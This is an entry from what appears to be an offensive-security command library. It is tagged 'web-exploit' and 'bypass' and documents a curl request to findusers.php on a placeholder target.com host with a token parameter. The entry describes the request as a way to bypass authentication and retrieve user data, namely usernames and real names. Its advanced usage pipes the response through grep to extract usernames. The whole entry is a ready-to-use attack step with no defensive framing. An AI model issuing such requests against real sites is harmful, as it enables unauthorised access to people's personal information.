---
id: cmd-uuid-003
data: 'curl "http://target.com/include/findusers.php?token=abc123def456"'
tags:
  - web-exploit
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.921Z'
verified: false
validated: true
submitted: true
---
# curl-bypass-with-token

## Command

```bash
curl "http://target.com/include/findusers.php?token=abc123def456"
```

## Description

Sends a request to findusers.php with a token parameter to bypass auth and retrieve user data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `?token=` | Security token value | Yes |
| URL | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/include/findusers.php?token=abc123def456"
```

### Advanced Usage

```bash
curl -s "http://target.com/include/findusers.php?token=abc123def456" | grep -o 'username[^<]*'
```

## Expected Output

HTML or data containing usernames and real names.

## Related

- [[Related Procedure]]
